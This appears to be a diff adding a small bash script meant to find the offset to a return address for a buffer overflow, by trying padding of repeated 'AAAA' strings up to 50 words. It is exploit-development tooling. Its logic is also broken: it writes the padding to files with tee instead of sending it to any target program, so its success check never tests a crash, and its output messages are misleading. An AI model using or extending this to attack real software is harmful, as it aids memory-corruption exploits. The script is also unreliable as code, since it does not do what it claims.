@@ -1,0 +1,7 @@
+#!/bin/bash
+for i in $(seq 1 50); do echo "Trying offset of $i words"
+tee $i <<EOF
+test
+$(printf "%0.sAAAA" $(seq 1 $i))
+EOF
+if [ $? != 0 ]; then echo "==> Correct ofsset to return address is $i words"; break; fi; done
